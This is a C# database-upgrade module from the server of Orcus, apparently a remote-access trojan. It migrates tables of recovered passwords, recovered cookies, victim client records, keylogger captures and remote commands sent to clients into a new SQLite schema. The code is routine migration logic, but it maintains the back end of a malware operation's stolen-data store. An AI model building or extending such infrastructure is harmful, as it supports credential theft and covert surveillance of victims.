using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Xml.Serialization;
using Mono.Data.Sqlite;
using NLog;
using Orcus.Shared.Compression;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core.Database.Update
{
    internal class DatabaseUpgrader1
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        public static SqliteConnection UpgradeDatabase(string fileName, SqliteConnection sqliteConnection)
        {
            sqliteConnection.Close(); //we don't need that
            sqliteConnection.Dispose();

            Logger.Info("Create new database");
            var newDatabase = new FileInfo(Path.Combine(Path.GetDirectoryName(fileName), Guid.NewGuid().ToString("N")));
            SqliteConnection.CreateFile(newDatabase.FullName);

            using (var newDatabaseConnection = new SqliteConnection($"Data Source={newDatabase.FullName};Version=3;"))
            {
                newDatabaseConnection.Open();
                Logger.Info("Create tables");
                DatabaseBuilder.CreateTables(newDatabaseConnection);

                Logger.Info("Import data");
                //attach old database
                using (
                    var command = new SqliteCommand($"ATTACH DATABASE '{fileName}' AS 'OldDatabase'", newDatabaseConnection)
                    )
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.Client (Id, UserName, HardwareId, ClientGroup, OSName, OSType, Language, LastSeen) SELECT Id, UserName, HardwareId, ClientGroup, OperatingSystemName, OSType, Language, LastSeen FROM OldDatabase.Client", newDatabaseConnection))
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.Exception SELECT * FROM OldDatabase.Exception", newDatabaseConnection))
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.RecoveredPassword SELECT * FROM OldDatabase.RecoveredPassword", newDatabaseConnection))
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.RecoveredCookie SELECT * FROM OldDatabase.RecoveredCookies", newDatabaseConnection))
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.NewClientsStatistic SELECT * FROM OldDatabase.NewClientsStatistics", newDatabaseConnection))
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.ClientsConnected SELECT * FROM OldDatabase.ClientsConnected", newDatabaseConnection))
                    command.ExecuteNonQuery();

                using (var command = new SqliteCommand("INSERT INTO main.ClientsConnectedStatistic SELECT * FROM OldDatabase.ClientsConnectedStatistics", newDatabaseConnection))
                    command.ExecuteNonQuery();

                DirectoryInfo dataDirectory = null;
                using (var command = new SqliteCommand("SELECT ClientId, Data, Timestamp FROM OldDatabase.KeyLog", newDatabaseConnection))
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        if (dataDirectory == null)
                        {
                            dataDirectory = new DirectoryInfo("data");
                            if (!dataDirectory.Exists)
                                dataDirectory.Create();
                        }

                        Guid fileNameGuid;
                        var dataFileName = Path.Combine(dataDirectory.FullName, (fileNameGuid = Guid.NewGuid()).ToString("D"));
                        while (File.Exists(dataFileName))
                        {
                            dataFileName = Path.Combine(dataDirectory.FullName, (fileNameGuid = Guid.NewGuid()).ToString("D"));
                        }

                        var data = LZF.Decompress((byte[])reader["Data"], 0);
                        File.WriteAllBytes(dataFileName, data);
                        using (
                            var command2 =
                                new SqliteCommand(
                                    $"INSERT INTO main.Data (ClientId, Timestamp, Length, FileName, DataMode, EntryName, IsCsvData) VALUES ({reader.GetInt32(0)}, @timestamp, {data.Length}, '{fileNameGuid.ToString("N")}', 'e10e9542f6324f68bdf6f0ef1c9d04d2', @entryName, 0)",
                                    newDatabaseConnection)
                            )
                        {
                            command2.Parameters.AddWithValue("@timestamp", DateTime.Parse(reader.GetString(2), CultureInfo.InvariantCulture));
                            command2.Parameters.AddWithValue("@entryName", "Automatic Key Log");
                            command2.ExecuteNonQuery();
                        }
                    }
                }

                using (var command = new SqliteCommand("SELECT Id, Succeeded, Failed, SentTo, Done, DynamicCommand, Parameter FROM OldDatabase.DynamicCommand", newDatabaseConnection))
                using (var reader = command.ExecuteReader())
                {
                    var types = DynamicCommandInfo.RequiredTypes.ToList();
                    types.Remove(typeof (EveryClientOnceTransmissionEvent));
                    var serializer = new Serializer(types);
                    var xmlSerializer = new XmlSerializer(typeof(DynamicCommand));

                    using (var transaction = newDatabaseConnection.BeginTransaction())
                    using (var command2 = newDatabaseConnection.CreateCommand())
                    {
                        command2.Transaction = transaction;
                        while (reader.Read())
                        {
                            //no reason to reuse the StringWriter
                            using (var stringWriter = new StringWriter())
                            {
                                command2.CommandText =
                                    $"INSERT INTO main.DynamicCommand (Id, Succeeded, Failed, SentTo, Done, DynamicCommand, Parameter) VALUES ({reader.GetInt32(0)}, {reader.GetInt32(1)}, {reader.GetInt32(2)}, {reader.GetInt32(3)}, {reader.GetInt32(4)}, @dynamicCommand, @parameter)";
                                DynamicCommand dynamicCommand;
                                try
                                {
                                    dynamicCommand =
                                        serializer.Deserialize<DynamicCommand>((byte[]) reader["DynamicCommand"]);
                                }
                                catch (Exception)
                                {
                                    continue;
                                }

                                xmlSerializer.Serialize(stringWriter, dynamicCommand);
                                command2.Parameters.AddWithValue("@dynamicCommand", stringWriter.ToString());
                                command2.Parameters.AddWithValue("@parameter", reader["Parameter"]);
                                command2.ExecuteNonQuery();
                                command2.Parameters.Clear();
                            }
                        }

                        transaction.Commit();
                    }
                }
            }

            Logger.Info("Upgrade finished, cleaning up");
            GC.Collect(); //necessary to free the database file, see here: https://stackoverflow.com/questions/8511901/system-data-sqlite-close-not-releasing-database-file
            GC.WaitForPendingFinalizers();
            File.Delete(fileName);
            newDatabase.MoveTo(fileName);

            var connection = new SqliteConnection($"Data Source={fileName};Version=3;");
            connection.Open();
            Logger.Info("Database opened");
            return connection;
        }
    }
}